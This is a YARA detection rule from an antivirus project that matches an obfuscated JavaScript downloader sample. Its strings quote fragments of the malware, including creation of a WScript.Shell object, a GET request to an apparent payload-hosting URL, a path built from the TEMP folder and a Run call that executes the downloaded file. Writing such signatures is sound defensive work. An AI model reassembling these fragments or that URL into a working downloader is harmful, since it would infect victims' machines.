rule sig_20160427_7e5fee8c291fed888210797599b6026e {
  meta:
    description = "datamaliciousorder - file 20160427_7e5fee8c291fed888210797599b6026e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "41ce784ba36edda2519f65a40366aac50468f87580eb738c01e17644e498948b"

  strings:
    $s1  = "EgneiDbyon[TgvtaGevqj](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function QlyjcCkjne(IbpyxHiwsq, CopwuImcza){DhyqyAjfew = DhyqyAjfew * 1; return IbpyxHiwsq - CopwuImcza;};" fullword ascii
    $s3  = "function IkuvpFddml() {return ZerwiBkzcs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"vcn6KXF" ascii
    $s4  = "function IkuvpFddml() {return ZerwiBkzcs[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"vcn6KXF" ascii
    $s5  = "function WexboGzqww() {return ((CnxirCtplw == true) && (CnxirCtplw == SchfsQcivi)) ? 1 : DhyqyAjfew;};" fullword ascii
    $s6  = "var ZerwiBkzcs = function RfleeHhbep() {return SfmthFvpcb[FizufHoltq](\"WScript\"+\".Shell\");}(), MfsbqZlpzi = 11;" fullword ascii
    $s7  = "var SfmthFvpcb = this[\"WScript\"];" fullword ascii
    $s8  = "var CnxirCtplw = false;" fullword ascii
    $s9  = "CnxirCtplw = true; " fullword ascii
    $s10 = "function JqnuwWuvdc(){return PqvslGkpsb + \"\";};" fullword ascii
    $s11 = "if (EgneiDbyon[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function SnskzLhcys(ZmyuhMymqq){ZerwiBkzcs[\"R\"+\"un\"](ZmyuhMymqq, DhyqyAjfew, DhyqyAjfew);};" fullword ascii
    $s13 = "return QlyjcCkjne(LuliqQdyyx, KngeqYdway);" fullword ascii
    $s14 = "function VebiwCeqxj()" fullword ascii
    $s15 = "function SoflnUfkkn(FfngsAezau) {var QdmekZzgap = (1, 2, 3, 4, 5, FfngsAezau); return QdmekZzgap;};" fullword ascii
    $s16 = "var SchfsQcivi = false;" fullword ascii
    $s17 = "}while (QcxpjVckyw);" fullword ascii
    $s18 = "function KgkgpQkenw(){return 23;};" fullword ascii
    $s19 = "var PlsvhSrlzq = false;" fullword ascii
    $s20 = "function XrvtiBhayd(){return FizufHoltq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}